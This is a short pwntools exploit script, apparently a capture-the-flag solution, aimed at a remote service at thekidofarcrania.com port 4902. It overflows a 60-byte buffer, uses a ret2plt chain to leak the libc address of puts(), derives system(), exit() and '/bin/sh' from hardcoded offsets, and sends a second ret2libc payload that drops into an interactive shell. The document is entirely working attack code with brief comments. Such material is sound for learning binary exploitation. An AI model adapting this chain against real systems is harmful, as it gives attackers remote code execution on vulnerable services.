from pwn import *

r = remote('thekidofarcrania.com', 4902)

elf = ELF('./server')
puts_plt = elf.plt['puts']                                          # puts() in PLT section
puts_got = elf.got['puts']                                          # puts() in GOT section
log.info(f"Address of puts() in PLT section: {hex(puts_plt)}")
log.info(f"Address of puts() in GOT section: {hex(puts_got)}")
payload = b'A'*60                                                   # Byte of buffer
payload += p32(puts_plt)
payload += p32(elf.sym["main"])
payload += p32(puts_got)
r.sendlineafter("Input some text:", payload)                        # Sendpayload after the given string
r.recvuntil("Return address: ")                                     # Receive addresses that behind the given string
r.recvline()                                                        # Ignore byte of return address
r.recvline()                                                        # Ignore "Legend: buff MODIFIED padding MODIFIED..." string
                                                       
puts_leak = u32(r.recv(4).strip().ljust(4, b"\x00"))
log.success(f"Success!!! Here's the puts() address in libc: {hex(puts_leak)}")
system_addr = puts_leak - 0x2a940
exit_addr = puts_leak - 0x37770
binsh_addr = puts_leak + 0x11658f
log.info(f"Address of system(): {hex(system_addr)}")
log.info(f"Address of exit(): {hex(exit_addr)}")
log.info(f"Address of /bin/sh: {hex(binsh_addr)}")

# system() -> return address of system() -> "/bin/sh"
payload = b'A'* 60
payload += p32(system_addr)
payload += p32(exit_addr)
payload += p32(binsh_addr)
r.sendlineafter("Input some text: ", payload)

r.interactive()
